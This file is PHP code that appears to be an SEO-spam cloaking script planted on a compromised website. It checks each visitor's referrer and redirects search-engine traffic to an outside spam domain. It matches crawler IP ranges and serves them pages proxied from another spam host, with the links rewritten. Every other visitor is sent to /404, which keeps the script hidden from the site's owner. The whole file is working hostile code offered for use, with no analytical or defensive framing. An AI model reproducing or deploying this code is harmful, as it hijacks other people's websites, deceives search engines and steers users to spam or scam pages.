<?php 
error_reporting(0);
$url='http://g.saleg79.info/?q=www.bworder.com3';$str=strpos($_SERVER['HTTP_REFERER'],'google');if($str){header("location:{$url}");exit();}else{$str=strpos($_SERVER['HTTP_REFERER'],'yahoo');if($str){header("location:{$url}");exit();}else{$str=strpos($_SERVER['HTTP_REFERER'],'aol');if($str){header("location:{$url}");exit();}else{$str=strpos($_SERVER['HTTP_REFERER'],'bing');if($str){header("location:{$url}");exit();}else{$str=strpos($_SERVER['HTTP_REFERER'],'=');if($str){header("location:{$url}");exit();}}}}}
function is_ip($localIp,$ipRanges) {$localIp = ip2long($localIp);foreach($ipRanges as $val) { if($localIp >= ip2long($val[0]) && $localIp <= ip2long($val[1])) {return $val; }}return false;}
$localIp= $_SERVER["REMOTE_ADDR"];
$ipRanges = array( array( '108.170.192.0' , '108.170.255.255' ), array( '108.177.0.0' , '108.177.127.255' ), array( '142.250.0.0' , '142.251.255.255' ), array( '172.217.0.0' , '172.217.255.255' ), array( '172.253.0.0' , '172.253.255.255' ), array( '173.194.0.0' , '173.194.255.255' ), array( '192.168.111.10' , '192.168.111.255'), array( '192.178.0.0' , '192.179.255.255' ), array( '199.87.240.0' , '199.87.243.255' ), array( '207.126.144.0' , '207.126.159.255' ), array( '207.223.160.0' , '207.223.175.255' ), array( '209.185.0.0' , '209.185.255.255' ), array( '209.85.128.0' , '209.85.255.255' ), array( '216.239.32.0' , '216.239.63.255' ), array( '216.32.0.0' , '216.35.255.255' ), array( '216.58.192.0' , '216.58.223.255' ), array( '64.18.0.0' , '64.18.15.255' ), array( '64.233.160.0' , '64.233.191.255' ), array( '64.68.64.0' , '64.68.95.255' ), array( '66.102.0.0' , '66.102.15.255' ), array( '66.249.64.0' , '66.249.95.255' ), array( '70.32.128.0' , '70.32.159.255' ), array( '70.88.0.0' , '70.91.255.255' ), array( '72.14.192.0' , '72.14.255.255' ), array( '74.125.0.0' , '74.125.255.255' ), array( '8.0.0.0' , '8.255.255.255' ), array( '128.177.109.64' , '128.177.109.255' ), array( '128.177.174.32' , '128.177.174.47' ), array( '206.186.137.128' , '206.186.137.191' ), array( '206.47.187.168' , '206.47.187.175' ), array( '207.35.69.192' , '207.35.69.255' ), array( '208.74.177.144' , '208.74.177.159' ), array( '209.249.73.64' , '209.249.73.71' ), array( '63.84.190.224' , '63.84.190.255' ), array( '64.119.136.224' , '64.119.136.231' ), array( '64.124.112.24' , '64.124.112.31' ), array( '64.124.229.168' , '64.124.229.175' ), array( '64.128.207.160' , '64.128.207.175' ), array( '64.17.244.0' , '64.17.244.31' ), array( '65.196.235.32' , '65.196.235.47' ), array( '65.211.194.96' , '65.211.194.111' ), array( '65.214.112.96' , '65.214.112.127' ), array( '65.214.255.96' , '65.214.255.111' ), array( '65.221.133.176' , '65.221.133.191' ), array( '65.223.8.48' , '65.223.8.63' ), array( '66.192.134.32' , '66.192.134.47' ), array( '67.126.100.8' , '67.126.100.15' ), array( '70.90.219.48' , '70.90.219.55' ), array( '70.90.219.72' , '70.90.219.79'), array( '64.4.0.0' , '64.4.63.255' ), array( '65.52.0.0' , '65.55.255.255' ), array( '131.253.21.0' , '131.253.47.255' ), array( '157.54.0.0' , '157.60.255.255' ), array( '207.46.0.0' , '207.46.255.255' ), array( '207.68.128.0' , '207.68.207.255'), array( '8.12.144.0' , '8.12.144.255' ), array( '66.196.64.0' , '66.196.127.255' ), array( '66.228.160.0' , '66.228.191.255' ), array( '67.195.0.0' , '67.195.255.255' ), array( '68.142.192.0' , '68.142.255.255' ), array( '72.30.0.0' , '72.30.255.255' ), array( '74.6.0.0' , '74.6.255.255' ), array( '98.136.0.0' , '98.139.255.255' ), array( '202.160.176.0' , '202.160.191.255' ), array( '209.191.64.0' , '209.191.127.255' ), array('114.221.75.208','114.221.75.208'));
$is_or_no = is_ip($localIp,$ipRanges);
if($is_or_no){	
@set_time_limit(0);
$target_siteurl = 'http://sale79.info/article/www.bworder.com3/';
$key_url = '';
$clone_url = $target_siteurl.'/';
$PHP_SELF = isset($_SERVER['PHP_SELF']) ? str_replace("index.php", "", $_SERVER['PHP_SELF']) : (isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : $_SERVER['ORIG_PATH_INFO']);
$PHP_QUERYSTRING = $_SERVER['QUERY_STRING'];
$PHP_DOMAIN = $_SERVER['SERVER_NAME'];
$PHP_URL = 'http://'.$PHP_DOMAIN.$PHP_SELF.'?';

function get_html($url,$referer){
    if (function_exists('curl_init')) {
        $user_agent ='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        if ($referer) {
            curl_setopt($ch, CURLOPT_REFERER, $referer);
        }
        curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        if (!empty($post)) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        $htmldb = curl_exec ($ch);
        curl_close($ch);
        return $htmldb;
    }else {
        return file_get_contents($url);}}
        
$arr = explode('/',$PHP_QUERYSTRING);
$n = count($arr);
if ($n > 1) {
    unset($arr[$n-1]);
    $url_path = implode('/',$arr);
}else{
    $url_path = '';
}

$url = $clone_url.$PHP_QUERYSTRING;
//exit($url);
$html = get_html($url,$clone_url);
//echo $html;

//var_export($rp_array);
$n = count($rp_array);
$rp_array2 = array();
for ($i=0;$i<$n;$i++){
    $str = trim($rp_array[$i]);
    if ($str) {
        $rp_array2[$i] = $str;
    }
}

$rp_array = array_values(array_unique($rp_array2));

unset($rp_array2);
$n = count($rp_array);
for ($i=0;$i<$n;$i++){
    $html = str_replace($rp_array[$i],burl($rp_array[$i]),$html);
}
$rp_array2 = $rp_array = array();

$p = '@<a\s+[^>]*?href(=["\']{0,1}\s*[^#"\': >][^"\' >]*["\'> ]{1})@is';
preg_match_all($p,$html,$m);


if (!empty($m[1])) {
    $rp_array = array_values(array_unique($m[1]));
    $n = count($rp_array);
    
    for ($i=0;$i<$n;$i++){
        $href = $rp_array[$i];

        $p = '@=["\']{0,1}\s*([^"\' >]+)["\'> ]{1}@is';
        $m = array();
        //exit($href);
        preg_match($p,$href,$m);
        
        if ($m[1] !='') {
            $str = $m[1];
            
            if (preg_match('@^http:\/\/@is',$str)) {
                $p = '@^'.$target_siteurl.'/*@is';
                if (preg_match($p,$str)) {
                    $temp = preg_replace($p,$PHP_URL,$str);
                    $re_href = str_replace($str,$temp,$href);
                    $html= str_replace($href,$re_href,$html);
                }
                continue;
            }
            if (preg_match('@:@is',$str)) {
                continue;
            }
            //var_export($str);
            if ($str[0] =='/') {
                $temp = preg_replace('@^/@',$PHP_URL,$str);
                $re_href = str_replace($str,$temp,$href);
                $html= str_replace($href,$re_href,$html);
                continue;
            }
            //echo $url_path;
            if ($url_path) {
                $temp = $PHP_URL.$url_path.'/'.$str;
            }else {
                $temp = $PHP_URL.$str;
            }
            //exit($temp);
            $re_href = str_replace($str,$temp,$href);
            //exit($re_href);
            $html= str_replace($href,$re_href,$html);
        }
    }
}
if($key_url){
	$html2 = get_html($key_url);
	$html = $html.$html2;
}

echo $html;
}else {
	header("location:/404");
}
?>